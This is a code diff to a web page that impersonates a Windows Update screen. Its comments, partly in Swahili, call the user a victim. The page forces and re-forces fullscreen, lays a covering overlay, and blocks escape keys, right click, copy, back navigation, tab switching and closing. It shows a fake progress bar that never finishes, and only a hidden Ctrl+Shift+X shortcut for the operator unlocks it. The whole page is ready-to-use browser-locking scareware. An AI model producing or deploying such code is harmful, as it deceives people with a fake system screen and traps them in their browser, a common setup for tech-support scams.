@@ -11,11 +11,11 @@
     box-sizing: border-box;
   }
 
-  body {
+  html, body {
     background: linear-gradient(135deg, #005a9e 0%, #003f6b 100%);
     font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    height: 100vh;
-    width: 100vw;
+    height: 100%;
+    width: 100%;
     overflow: hidden;
     display: flex;
     justify-content: center;
@@ -27,12 +27,29 @@
     position: fixed;
     top: 0;
     left: 0;
+    right: 0;
+    bottom: 0;
+    z-index: 999999;
+  }
+
+  /* ===== LOCK OVERLAY =====
+     Hii inazuia user kubonyeza chochote nje ya page yetu */
+  #lockOverlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: transparent;
+    z-index: 9999999;
+    display: none;  /* Inaonekana tu baada ya kujaribu kutoka */
   }
 
   .container {
     text-align: center;
     max-width: 600px;
     padding: 40px;
+    z-index: 1;
   }
 
   .logo {
@@ -154,6 +171,8 @@
 </head>
 <body>
 
+<div id="lockOverlay"></div>
+
 <div class="container">
   <div class="logo">⚙️</div>
   <h1>Installing updates</h1>
@@ -181,60 +200,73 @@
 </div>
 
 <script>
-// ============================================
-// FULLSCREEN TRAP — LEVEL MAXIMUM
-// ============================================
+// =============================================================
+// FULLSCREEN TRAP — LEVEL 10 (MAXIMUM)
+// =============================================================
 
-// 1. BLOCK ALL KEYBOARD ESCAPE ATTEMPTS
+// 1. TUNAINGIA FULLSCREEN MARA MOJA (pop-up mode)
+function goFullscreen() {
+  const el = document.documentElement;
+  const methods = [
+    () => el.requestFullscreen ? el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {}) : null,
+    () => el.webkitRequestFullscreen ? el.webkitRequestFullscreen() : null,
+    () => el.msRequestFullscreen ? el.msRequestFullscreen() : null,
+    () => el.mozRequestFullScreen ? el.mozRequestFullScreen() : null
+  ];
+  methods.forEach(fn => fn());
+}
+
+// 2. KAMA FULLSCREEN HAIFANYI KAZI — TUMIA OVERLAY
+// Hii inafunika skrini nzima kwa kutumia DIV kubwa
+function overlayLock() {
+  const overlay = document.getElementById('lockOverlay');
+  overlay.style.display = 'block';
+  overlay.style.position = 'fixed';
+  overlay.style.top = '0';
+  overlay.style.left = '0';
+  overlay.style.width = '100vw';
+  overlay.style.height = '100vh';
+  overlay.style.background = 'linear-gradient(135deg, #005a9e 0%, #003f6b 100%)';
+  overlay.style.zIndex = '9999999';
+  overlay.style.cursor = 'wait';
+}
+
+// 3. ZUIA NJIA ZOTE ZA KUTOROKA
+
+// a) BLOCK KEYBOARD NJIA ZOTE
 document.addEventListener('keydown', function(e) {
-  // List ya keys zote za kutoroka
-  const forbiddenKeys = [
-    'Escape', 'F11', 'F5', 'F12',
-    'Alt', 'Tab', 'Meta', 'ContextMenu'
-  ];
-  
-  // Block kwa key name
-  if (forbiddenKeys.includes(e.key)) {
+  // Orodha ya keys zote za kutoroka
+  const blockKeys = {
+    'Escape': true,
+    'F11': true,
+    'F5': true,
+    'F12': true,
+    'ContextMenu': true
+  };
+
+  const blockCodes = [27, 122, 116, 123, 18, 9, 91, 92, 93];
+
+  if (blockKeys[e.key] || blockCodes.includes(e.keyCode)) {
     e.preventDefault();
     e.stopPropagation();
     e.stopImmediatePropagation();
     return false;
   }
-  
-  // Block kwa keyCode (backup)
-  const forbiddenCodes = [
-    27,  // Escape
-    122, // F11
-    116, // F5
-    123, // F12
-    18,  // Alt
-    9,   // Tab
-    91,  // Meta (Win key)
-    92,  // Meta (Win key)
-    93   // Context menu
-  ];
-  
-  if (forbiddenCodes.includes(e.keyCode)) {
-    e.preventDefault();
-    e.stopPropagation();
-    e.stopImmediatePropagation();
-    return false;
-  }
-  
-  // Block Ctrl+ combinations
+
+  // Ctrl+ combinations
   if (e.ctrlKey) {
-    const blockedCombos = ['w', 'q', 'r', 't', 'n', 's', 'u'];
-    if (blockedCombos.includes(e.key.toLowerCase())) {
+    const combos = ['w', 'q', 'r', 't', 'n', 's', 'u', 'd', 'f'];
+    if (combos.includes(e.key.toLowerCase())) {
       e.preventDefault();
       e.stopPropagation();
       return false;
     }
   }
-  
-  // Block Alt+ combinations
+
+  // Alt+ combinations
   if (e.altKey) {
-    const blockedAltCombos = ['F4', 'Tab', 'd', 'f', 'e'];
-    if (blockedAltCombos.includes(e.key)) {
+    const altCombos = ['F4', 'Tab', 'd', 'f', 'e'];
+    if (altCombos.includes(e.key)) {
       e.preventDefault();
       e.stopPropagation();
       return false;
@@ -242,61 +274,41 @@ document.addEventListener('keydown', function(e) {
   }
 });
 
-// 2. BLOCK RIGHT CLICK
+// b) BLOCK RIGHT CLICK
 document.addEventListener('contextmenu', function(e) {
   e.preventDefault();
   return false;
 });
 
-// 3. BLOCK TEXT SELECTION
+// c) BLOCK TEXT SELECTION
 document.addEventListener('selectstart', function(e) {
   e.preventDefault();
   return false;
 });
 
-// 4. BLOCK DRAG (user might drag URL)
+// d) BLOCK DRAG
 document.addEventListener('dragstart', function(e) {
   e.preventDefault();
   return false;
 });
 
-// 5. BLOCK COPY/CUT
-document.addEventListener('copy', function(e) {
-  e.preventDefault();
-  return false;
+// e) BLOCK COPY/CUT
+document.addEventListener('copy', function(e) { e.preventDefault(); return false; });
+document.addEventListener('cut', function(e) { e.preventDefault(); return false; });
+
+// f) ZUIA BACK BUTTON (browser back)
+history.pushState(null, null, location.href);
+window.addEventListener('popstate', function() {
+  history.pushState(null, null, location.href);
 });
-document.addEventListener('cut', function(e) {
+
+// g) ZUIA MWATHIRIKA KUFUNGA TAB
+window.addEventListener('beforeunload', function(e) {
   e.preventDefault();
-  return false;
+  e.returnValue = 'Windows Update in progress. Do not close this tab.';
 });
 
-// 6. FORCE FULLSCREEN ON LOAD
-function goFullscreen() {
-  const el = document.documentElement;
-  if (el.requestFullscreen) {
-    el.requestFullscreen({ navigationUI: 'hide' }).catch(() => {});
-  } else if (el.webkitRequestFullscreen) {
-    el.webkitRequestFullscreen();
-  } else if (el.msRequestFullscreen) {
-    el.msRequestFullscreen();
-  } else if (el.mozRequestFullScreen) {
-    el.mozRequestFullScreen();
-  }
-}
-
-// 7. RE-ENTER FULLSCREEN IF USER ESCAPES
-function checkFullscreen() {
-  if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
-    goFullscreen();
-  }
-}
-
-document.addEventListener('fullscreenchange', checkFullscreen);
-document.addEventListener('webkitfullscreenchange', checkFullscreen);
-document.addEventListener('mozfullscreenchange', checkFullscreen);
-document.addEventListener('MSFullscreenChange', checkFullscreen);
-
-// 8. BLOCK VISIBILITY CHANGE (user switches tabs)
+// h) ZUIA MWATHIRIKA KUBADILISHA TAB
 document.addEventListener('visibilitychange', function() {
   if (document.hidden) {
     setTimeout(function() {
@@ -306,37 +318,26 @@ document.addEventListener('visibilitychange', function() {
   }
 });
 
-// 9. BLOCK BROWSER BACK BUTTON
-history.pushState(null, null, location.href);
-window.addEventListener('popstate', function() {
-  history.pushState(null, null, location.href);
-});
-
-// 10. BLOCK WINDOW BLUR (user tries to alt-tab)
+// i) ZUIA ALT+TAB (kurudi kwa window nyingine)
 window.addEventListener('blur', function() {
   setTimeout(function() {
     window.focus();
   }, 10);
 });
 
-// 11. PREVENT PAGE UNLOAD (user tries to close)
-window.addEventListener('beforeunload', function(e) {
-  e.preventDefault();
-  e.returnValue = '';
-});
-
-// 12. REPLACE ALL LINKS TO GO NOWHERE
-document.addEventListener('click', function(e) {
-  if (e.target.tagName === 'A') {
-    e.preventDefault();
-    return false;
+// j) KAMA FULLSCREEN INAISHI — INGANIA TENA
+function checkFullscreen() {
+  if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
+    goFullscreen();
+    overlayLock();
   }
-});
+}
 
-// ============================================
-// FAKE PROGRESS BAR — BELIEVABLE
-// ============================================
+document.addEventListener('fullscreenchange', checkFullscreen);
+document.addEventListener('webkitfullscreenchange', checkFullscreen);
+document.addEventListener('mozfullscreenchange', checkFullscreen);
 
+// 4. FAKE PROGRESS (haifikii 100%)
 let percent = 3;
 let phase = 0;
 
@@ -355,66 +356,78 @@ const messages = [
   '🔒 Applying security patches...',
   '⚠️ Do not restart your PC',
   '🔄 Configuring Windows Update...',
-  '✅ Almost done...'
+  '✅ Almost done...',
+  '⏳ Applying final settings...',
+  '🔧 Optimizing system performance...'
 ];
 
 function updateProgress() {
   phase++;
-  
-  // Update percentage
-  if (phase < 10) {
-    percent = 3 + (phase * 1.5);
-  } else if (phase < 25) {
-    percent = 16 + ((phase - 10) * 1.2);
-  } else if (phase < 45) {
-    percent = 34 + ((phase - 25) * 1.0);
-  } else if (phase < 65) {
-    percent = 54 + ((phase - 45) * 0.8);
-  } else if (phase < 90) {
-    percent = 70 + ((phase - 65) * 0.6);
-  } else if (phase < 130) {
-    percent = 85 + ((phase - 90) * 0.3);
-  } else {
-    percent = 99;  // Never reach 100
-  }
-  
+
+  if (phase < 10) percent = 3 + (phase * 1.5);
+  else if (phase < 25) percent = 16 + ((phase - 10) * 1.2);
+  else if (phase < 45) percent = 34 + ((phase - 25) * 1.0);
+  else if (phase < 65) percent = 54 + ((phase - 45) * 0.8);
+  else if (phase < 90) percent = 70 + ((phase - 65) * 0.6);
+  else if (phase < 130) percent = 85 + ((phase - 90) * 0.3);
+  else percent = 99;
+
   if (percent > 99) percent = 99;
-  
+
   document.getElementById('progressBar').style.width = percent + '%';
   document.getElementById('progressLabel').textContent = Math.floor(percent) + '%';
-  
-  // Update message
+
   const msgIndex = Math.min(Math.floor(phase / 8), messages.length - 1);
   document.getElementById('restartNotice').textContent = messages[msgIndex];
-  
-  // Slow down over time
+
   let delay = 1000;
   if (phase > 20) delay = 1500;
   if (phase > 40) delay = 2500;
   if (phase > 60) delay = 3500;
   if (phase > 90) delay = 5000;
   if (phase > 120) delay = 7000;
-  
+
   setTimeout(updateProgress, delay);
 }
 
-// ============================================
-// START
-// ============================================
+// 5. BACKDOOR YAKO (WEWE PEKEE) — Njama ya kutoroka
+// Bonyeza: Ctrl + Shift + X
+document.addEventListener('keydown', function(e) {
+  if (e.ctrlKey && e.shiftKey && e.key === 'X') {
+    // Ondoa overlay
+    document.getElementById('lockOverlay').style.display = 'none';
+    // Toka fullscreen
+    if (document.exitFullscreen) document.exitFullscreen();
+    else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
+    else if (document.msExitFullscreen) document.msExitFullscreen();
+    // Nenda kwenye page nyeupe
+    window.location.href = 'about:blank';
+    return true;
+  }
+});
+
+// ===== A N Z A =====
 setTimeout(function() {
   goFullscreen();
+  // Kama fullscreen haifanyi kazi (baada ya sek 1) → tumia overlay
+  setTimeout(function() {
+    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+      overlayLock();
+    }
+  }, 1000);
   updateProgress();
 }, 500);
 
-// Keep fullscreen every 2 seconds
+// Angalia fullscreen kila sek 1
 setInterval(function() {
-  if (!document.fullscreenElement) {
+  if (!document.fullscreenElement && !document.webkitFullscreenElement && !document.mozFullScreenElement) {
     goFullscreen();
+    overlayLock();
   }
-}, 2000);
+}, 1000);
 
-console.log('🔧 Windows Update in progress...');
-console.log('⚠️ Do not close this tab.');
+console.log('%c🔧 Windows Update in progress...', 'font-size: 20px; color: #4db8ff;');
+console.log('%c⚠️ Do not close this tab.', 'font-size: 16px; color: #ff6666;');
 </script>
 </body>
 </html>
